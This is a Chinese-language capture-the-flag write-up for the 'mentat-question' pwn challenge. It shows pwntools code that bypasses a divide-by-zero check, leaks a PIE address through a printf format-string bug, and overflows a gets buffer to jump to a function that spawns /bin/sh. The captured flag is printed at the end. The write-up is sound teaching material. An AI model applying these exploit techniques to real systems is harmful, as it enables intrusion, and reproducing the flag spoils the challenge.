# mentat-question

## 题目简述

程序提供整数除法服务。除数小于 1 时会进入异常处理分支，其中先用 `gets` 读入 16 字节栈缓冲区，再把用户输入直接交给 `printf`。需要绕过对字符 `0` 的表面检查，利用格式化字符串泄露 PIE 基址，并在第二轮通过栈溢出跳转到执行 `/bin/sh` 的 `secret`。

## 解题过程

主函数仅用下面的判断阻止除零：

```c
if (strncmp(buf, "0", 1) == 0) {
    return 1;
} else {
    num2 = atoi(buf);
}
```

它检查的是首字符，而不是转换后的数值。输入非数字字符串即可让 `atoi` 返回 0；官方脚本输入 `4294967296`，在题目环境中转换后同样得到 0，同时首字符又不是 `0`。于是 `calculate()` 内的 `num2 < 1` 成立，程序进入脆弱分支。

第一轮输入 `Yes %p`。`strncmp` 只要求前三个字符为 `Yes`，随后执行 `printf(buf)`，形成格式化字符串漏洞。官方环境中此时 RSI 残留一个指向 PIE 映像内部的地址，裸 `%p` 正好将其打印出来；该指针相对程序基址的偏移为 `0x206d`：

```python
p.sendlineafter(b"?", b"Division")
p.sendlineafter(b"?", b"123")
p.sendline(str(2**32).encode())
p.sendlineafter(b"?", b"Yes %p")

p.recvline()
leak = int(p.recvline()[15:29], 16)
elf.address = leak - 0x206d
```

`calculate()` 在异常分支返回 0，因此 `while (res == 0)` 会进入第二轮。再次制造零除数后，`gets(buf)` 允许越过 16 字节缓冲区覆盖保存的返回地址。实测从输入开头到返回地址为 24 字节，前 4 字节必须仍为 `Yes `，因此填充 20 个 `A`。

程序自带：

```c
void secret() {
    system("/bin/sh");
}
```

将返回地址写成 `secret + 4`，跳过函数序言以修正调用 `system` 前的栈对齐：

```python
p.sendlineafter(b"?", b"123")
p.sendline(str(2**32).encode())
p.sendlineafter(
    b"?",
    b"Yes " + b"A" * 20 + p64(elf.sym["secret"] + 4),
)
p.interactive()
```

进入 shell 后读取：

```text
UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}
```

## 方法总结

本题把三个缺陷串在一起：字符串形式的除零检查与数值转换不一致、用户输入被当作格式串、`gets` 造成无界栈写。PIE 使直接覆盖固定地址不可行，因此第一轮先泄露映像内指针，第二轮才覆盖返回地址；跳转到 `secret + 4` 则解决了 x86-64 ABI 栈对齐问题。
